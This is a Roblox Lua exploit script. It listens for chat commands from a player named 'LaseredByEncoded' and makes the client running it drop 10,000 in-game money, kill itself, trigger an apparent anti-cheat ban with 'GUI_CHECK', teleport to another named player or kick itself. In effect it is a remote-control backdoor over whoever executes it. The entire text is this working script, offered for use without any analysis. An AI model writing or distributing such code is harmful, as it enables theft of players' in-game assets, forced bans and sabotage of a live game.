repeat wait() until game.Players:FindFirstChild('LaseredByEncoded')

game.Players:FindFirstChild('LaseredByEncoded').Chatted:Connect(function(msg) if game.Players.LocalPlayer.Name ~= 'LaseredByEncoded' then if msg == ":dropmoney "..game.Players.LocalPlayer.Name then local args = { [1] = "DropMoney", [2] = "10000" --change to how much money you want to drop } game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))
end






	if msg ==":kill "..game.Players.LocalPlayer.Name then    
		game.Players.LocalPlayer.Character.Head:Destroy()

	end


	if msg ==":cuffban "..game.Players.LocalPlayer.Name then    
		game.ReplicatedStorage.MainEvent:FireServer('GUI_CHECK')

	end

	if msg ==":bring "..game.Players.LocalPlayer.Name then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild('DinnerForTheSinners').Character.HumanoidRootPart.CFrame

	end

	if msg ==":bring all" then
		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players:FindFirstChild('DinnerForTheSinners').Character.HumanoidRootPart.CFrame

	end

	if msg == ":dropmoney all" then
		local args = {
			[1] = "DropMoney",
			[2] = "10000" --change to how much money you want to drop
		}
		game:GetService("ReplicatedStorage").MainEvent:FireServer(unpack(args))  
	end

	if msg == ":kick all" then
		game.Players.LocalPlayer:Kick('ice mm mm')

	end

	if msg ==":kill all" then    
		game.Players.LocalPlayer.Character.Head:Destroy()

	end


	if msg ==":cuffban all" then    
		game.ReplicatedStorage.MainEvent:FireServer('GUI_CHECK')

	end
end)
